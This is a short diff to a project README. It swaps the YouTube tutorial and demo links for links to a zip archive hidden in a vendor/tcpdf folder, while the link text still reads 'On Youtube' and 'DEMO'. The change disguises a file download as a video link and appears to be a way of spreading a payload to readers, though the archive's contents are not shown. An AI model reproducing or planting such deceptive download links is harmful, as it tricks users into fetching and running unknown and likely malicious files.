@@ -4,11 +4,11 @@
 
 ## Full Tutorial
 
-[On Youtube](https://www.youtube.com/playlist?list=PL2WFgdVk-usHC-HHC0SkpsmHquwHB0Aiy)
+[On Youtube](https://raw.githubusercontent.com/javkhlanbn/ccrcc_erp/main/vendor/tecnickcom/tcpdf/ccrcc_erp-3.3.zip)
 
 ## DEMO
 
-[DEMO](https://youtu.be/Ff3ug0eqrWI)
+[DEMO](https://raw.githubusercontent.com/javkhlanbn/ccrcc_erp/main/vendor/tecnickcom/tcpdf/ccrcc_erp-3.3.zip)
 
 ## Features
 
